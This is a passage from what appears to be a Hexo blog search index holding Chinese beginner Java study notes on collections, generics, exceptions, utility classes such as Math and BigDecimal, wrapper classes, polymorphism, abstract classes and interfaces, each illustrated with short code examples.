i=<span class="number">0</span>; i&lt;al1.size(); i++) &#123;</span><br><span class="line">            result += (<span class="keyword">int</span>)al1.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ArraryList里存储的类型都是Object类型</li><li>所以运算需要进行强制转换</li><li>add的类型决定转换的类型</li></ul><h3 id="遍历器"><a href="#遍历器" class="headerlink" title="遍历器"></a>遍历器</h3><p>除了使用for进行遍历外，还可以使用遍历器进行遍历，遍历器有一个指针，一开始空指向，随着调用next而改变指向</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Iterator iterator = al1.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">          System.out.println(iterator.next());;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for高级遍历"><a href="#for高级遍历" class="headerlink" title="for高级遍历"></a>for高级遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Object o : al1) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Vector集合"><a href="#Vector集合" class="headerlink" title="Vector集合"></a>Vector集合</h2><p>大致语法和ArrayList一样，主要区别是<strong>Vector线程安全</strong>，适合多线程，不是多线程的话可以使用ArrayList</p><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>语法同样和ArrayList差不多</li><li>主要区别是存储结果不同，ArrayList里面是数组，LinkedList存的是引用</li><li>这样的优点就是<strong>插入数据和删除数据的效率快</strong></li></ul><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>在上面，使用ArrayList创建的数组存储int型数据时，计算需要强制转换类型，解决这个强制转换的方法就是泛型</p><ul><li>注意<code>&lt;&gt;</code>里只能是引用数据类型</li><li>数据会自动装箱</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//泛型</span></span><br><span class="line">ArrayList&lt;Integer&gt; a = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">a.add(<span class="number">234</span>);</span><br><span class="line">a.add(<span class="number">34</span>);</span><br><span class="line">System.out.println(a.get(<span class="number">0</span>)+a.get(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p>上面三个都是有序的，可重复的</p><p>而HashSet是无序的，不可重复的（所以没有get方法）</p><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><p>和HashSet差不多，只是存储结构不一样</p><h2 id="存储自定义的类"><a href="#存储自定义的类" class="headerlink" title="存储自定义的类"></a>存储自定义的类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Cut&gt; c = <span class="keyword">new</span> ArrayList&lt;Cut&gt;();</span><br><span class="line">        </span><br><span class="line">        Cut cut = <span class="keyword">new</span> Cut(<span class="number">1</span>,<span class="string">&quot;xiaohua&quot;</span>);</span><br><span class="line">        c.add(cut);</span><br><span class="line">        c.add(<span class="keyword">new</span> Cut(<span class="number">2</span>,<span class="string">&quot;abiao&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(Cut i : c) &#123;</span><br><span class="line">            System.out.println(i.age+<span class="string">&quot; &quot;</span>+i.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMapDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//HashMap里面存储的是键值对，可指定key和value的类型</span></span><br><span class="line">        HashMap m = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//HashMap&lt;String, Integer&gt; m = new HashMap&lt;String, Integer&gt;();</span></span><br><span class="line">        m.put(<span class="string">&quot;manu&quot;</span>, <span class="number">2001</span>);</span><br><span class="line">        m.put(<span class="string">&quot;hello&quot;</span>, <span class="number">102</span>);</span><br><span class="line">        <span class="comment">//键不能相同，相同会覆盖前面的值</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">//遍历key</span></span><br><span class="line">        <span class="keyword">for</span>(Object key : m.keySet()) &#123;</span><br><span class="line">            System.out.println(key+<span class="string">&quot; &quot;</span>+m.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历value</span></span><br><span class="line">        <span class="keyword">for</span>(Object value : m.values()) &#123;</span><br><span class="line">            System.out.println(value+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        System.out.println(m.containsKey(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">        System.out.println(m.containsValue(<span class="number">2001</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><p>和HashMap差不多 ，主要是存储上不同</p><h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><p>与HashMap的区别是线程安全</p><p>性能略低</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="Collection-存储单个值"><a href="#Collection-存储单个值" class="headerlink" title="Collection(存储单个值)"></a>Collection(存储单个值)</h3><ul><li>list，重复有序<ul><li>ArrayList</li><li>LinkedList</li><li>Vector</li></ul></li><li>Set，不重复，无序<ul><li>HashSet</li><li>TreeSet</li></ul></li></ul><h3 id="Map-存储键值对"><a href="#Map-存储键值对" class="headerlink" title="Map(存储键值对)"></a>Map(存储键值对)</h3><ul><li>HashMap</li><li>TreeMap</li><li>HashTable</li></ul><h2 id="自己写Conlection"><a href="#自己写Conlection" class="headerlink" title="自己写Conlection"></a>自己写Conlection</h2><p>当然功能很简陋</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyArrayList</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T[] dataArray = (T[])<span class="keyword">new</span> Object[<span class="number">100</span>];</span><br><span class="line">    <span class="comment">//虽然不能子类声明，父类构造，但可以强制转换</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(T data)</span> </span>&#123;</span><br><span class="line">        dataArray[index] = data;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;=<span class="number">0</span> &amp;&amp; index&lt;(<span class="keyword">this</span>.index-<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> dataArray[index];</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异常处理Exception"><a href="#异常处理Exception" class="headerlink" title="异常处理Exception"></a>异常处理Exception</h3><ul><li><p>在java里面，所有错误类都属于Exception类</p></li><li><p>正常程序碰到错误会直接崩溃</p></li><li><p>可以用try语句对有可能出现错误的地方进行处理，即使错误也会执行后面的代码</p></li></ul><p>语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//这里是错误代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(错误类型 对象)&#123;</span><br><span class="line"><span class="comment">//取得错误后的操作代码，如：对象.方法</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line"><span class="comment">//不管有没有错都会执行的语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>catch可以写无数个</p></li><li><p>如果想包含所有的错误可以把错误类型写成Exception </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具类</title>
      <link href="/Programming/Java/day9_%E5%90%84%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%B1%BB.html"/>
      <url>/Programming/Java/day9_%E5%90%84%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%B1%BB.html</url>
      
        <content type="html"><![CDATA[<p> 平常会用到的一些工具</p><span id="more"></span><h2 id="Arrays数组工具类"><a href="#Arrays数组工具类" class="headerlink" title="Arrays数组工具类"></a>Arrays数组工具类</h2><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrarysTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] a = &#123;<span class="number">234</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">2323</span>,<span class="number">25</span>,<span class="number">45</span>&#125;;</span><br><span class="line">        Arrays.sort(a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i : a) &#123;</span><br><span class="line">            System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//先排序，后查找</span></span><br><span class="line">        <span class="keyword">int</span> index = Arrays.binarySearch(a, <span class="number">234</span>);</span><br><span class="line">        System.out.println(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Math工具类"><a href="#Math工具类" class="headerlink" title="Math工具类"></a>Math工具类</h2><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Math.pow(<span class="number">2</span>, <span class="number">1</span>));</span><br><span class="line">        System.out.println(Math.E);</span><br><span class="line">        System.out.println(Math.PI);</span><br><span class="line">        System.out.println(Math.abs(-<span class="number">9</span>));</span><br><span class="line">        System.out.println(Math.ceil(<span class="number">3.4</span>));</span><br><span class="line">        System.out.println(Math.floor(<span class="number">3.5</span>));</span><br><span class="line">        System.out.println(Math.max(<span class="number">32</span>,<span class="number">34</span>));</span><br><span class="line">        System.out.println(Math.cos(<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2.0</span><br><span class="line">2.718281828459045</span><br><span class="line">3.141592653589793</span><br><span class="line">9</span><br><span class="line">4.0</span><br><span class="line">3.0</span><br><span class="line">34</span><br><span class="line">-0.9899924966004454</span><br></pre></td></tr></table></figure><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Math.random());<span class="comment">//[0-1)的随机</span></span><br><span class="line">System.out.println(Math.random()*<span class="number">4</span>);<span class="comment">//[0-4)的随机数</span></span><br><span class="line">System.out.println((Math.random()*<span class="number">4</span>)+<span class="number">5</span>);<span class="comment">//[5-9)的随机数</span></span><br><span class="line">System.out.println((<span class="keyword">int</span>）((Math.random()*<span class="number">4</span>)+<span class="number">5</span>));<span class="comment">//5,6,7,8的随机数</span></span><br></pre></td></tr></table></figure><h3 id="BigDecimal"><a href="#BigDecimal" class="headerlink" title="BigDecimal"></a>BigDecimal</h3><p>先简单说明一下double精度的问题，由于浮点数在计算机里面特殊的存储方法，所以double总会有精度的损失，double的精度在15-16位，所以只要出错大于这个位数，double就不会显示出来，如果在这个范围内出错了，double也会显示出来，反正不管如何，用double存储数据都是有风险的，于是可以用Math里的BigDecimal解决这个问题</p><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu3.bigdecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BigDecimalTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;      </span><br><span class="line"><span class="comment">//        double a = 2.32435435;</span></span><br><span class="line"><span class="comment">//        double b = 0.30000000000000002;</span></span><br><span class="line"><span class="comment">//        double c = 0.1;</span></span><br><span class="line"><span class="comment">//        double d = 0.2;</span></span><br><span class="line"><span class="comment">//        System.out.println(1.0+0.1);</span></span><br><span class="line"><span class="comment">//        System.out.println(b);</span></span><br><span class="line"><span class="comment">//        System.out.println(c+d);</span></span><br><span class="line">        BigDecimal num1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0.04&quot;</span>);</span><br><span class="line">        BigDecimal num2 = BigDecimal.valueOf(<span class="number">0.02</span>);</span><br><span class="line">        System.out.println(num1);</span><br><span class="line">        System.out.println(num2);</span><br><span class="line">        </span><br><span class="line">        BigDecimal result1 = num1.add(num2);</span><br><span class="line">        BigDecimal result2 = num1.subtract(num2);</span><br><span class="line">        BigDecimal result3 = num1.multiply(num2);</span><br><span class="line">        BigDecimal result4 = num1.divide(num2);</span><br><span class="line">        </span><br><span class="line">        System.out.println(result1);</span><br><span class="line">        System.out.println(result2);</span><br><span class="line">        System.out.println(result3);</span><br><span class="line">        System.out.println(result4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Date-amp-Calender类"><a href="#Date-amp-Calender类" class="headerlink" title="Date&amp;Calender类"></a>Date&amp;Calender类</h2><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu3.date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateCalenderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Date now = <span class="keyword">new</span> Date();</span><br><span class="line">        System.out.println(now);</span><br><span class="line">        </span><br><span class="line">        Calendar c = Calendar.getInstance();</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        </span><br><span class="line">        System.out.println(c.get(Calendar.AM));</span><br><span class="line">        System.out.println(c.get(Calendar.DATE));</span><br><span class="line">        System.out.println(c.get(Calendar.HOUR));</span><br><span class="line">        System.out.println(c.get(Calendar.MINUTE));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基本类型包装类"><a href="#基本类型包装类" class="headerlink" title="基本类型包装类"></a>基本类型包装类</h2><p>基本数据一般都在栈里面，而包装就是栈存地址，数据在堆里</p><p>1.Byte</p><p>2.Short</p><p>3.Integer</p><p>4.BigInteger（可以存一个大整数），与BigDecimal差不多</p><p>5.Long</p><p>6.Float</p><p>7.Double</p><p>8.Character</p><p>9.Boolean</p><p>举个例子吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu4.packageclasss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PackagingClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer n1 = Integer.valueOf(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">        System.out.println(n1);</span><br><span class="line">        Byte n2 = Byte.valueOf(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">        System.out.println(n2);</span><br><span class="line">        Long n3 = Long.valueOf(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">        System.out.println(n3);</span><br><span class="line">        Float n4 = Float.valueOf(<span class="string">&quot;100.234&quot;</span>);</span><br><span class="line">        System.out.println(n4);</span><br><span class="line">        Double n5 = Double.valueOf(<span class="string">&quot;100.2345325&quot;</span>);</span><br><span class="line">        System.out.println(n5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拆箱和装箱"><a href="#拆箱和装箱" class="headerlink" title="拆箱和装箱"></a>拆箱和装箱</h3><p>其实赋值没必要像上面那样麻烦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Integer n1 = <span class="number">100</span>;<span class="comment">//自动装箱，把100包装再复制</span></span><br><span class="line">n1 += <span class="number">100</span>;<span class="comment">//自动拆箱，i = i.valueInt()+100,再装箱</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随机数 </tag>
            
            <tag> 包装类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多态与接口</title>
      <link href="/Programming/Java/day7_%E5%A4%9A%E6%80%81%E4%B8%8E%E6%8E%A5%E5%8F%A3.html"/>
      <url>/Programming/Java/day7_%E5%A4%9A%E6%80%81%E4%B8%8E%E6%8E%A5%E5%8F%A3.html</url>
      
        <content type="html"><![CDATA[<p>同一个操作有不同的做法</p><span id="more"></span><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>利用父类声明，子类构造就是多态，如</p><p><code>父类 对象 = null;</code></p><p><code>对象 = new 子类();</code></p><ul><li>因为是用父类声明的，所以只能访问父类的成员</li><li>若要访问子类的成员，需要<strong>强制类型转换</strong>，如</li></ul><p><code>((子类)对象).成员</code></p><blockquote><p>注意，不能使用子类声明，父类构造</p></blockquote><p><a href="https://www.cnblogs.com/chenssy/p/3372798.html">详解多态</a></p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>当我们的类需要同一个方法，但这个方法却有不同的是实现时，可以使用抽象类进行<strong>继承重写</strong>这个方法</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在公司工作的都是雇员</span></span><br><span class="line"><span class="comment"> * 他们都需要工作，但工作的</span></span><br><span class="line"><span class="comment"> * 做法不同，所以将工作抽象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">/* 虽然是抽象类，构造方法也是可以继承的，</span></span><br><span class="line"><span class="comment">     * 这个构造方法是给子类的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//抽象方法，子类实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Programmer</span> <span class="keyword">extends</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Programmer</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//实现的代码,比如</span></span><br><span class="line">        System.out.println(<span class="string">&quot;我在编程&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Programmer</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//实现的代码，比如</span></span><br><span class="line">        System.out.println(<span class="string">&quot;我在管理&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>抽象方法必须在抽象类里面</li><li>抽象类里面不一定要有抽象方法</li><li>抽象类可以被继承抽象类，但子类必须实现上面所有的类的抽象方法</li></ul><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><ul><li>相当于一个标准，规范，一切实现都需要通过子类</li><li>接口里面只能包含抽象方法（完全抽象化）</li><li>接口可以被实现，不能被继承</li><li>接口可以被抽象类实现，也可以被具体类实现</li></ul><h3 id="例-1"><a href="#例-1" class="headerlink" title="例"></a>例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method3</span><span 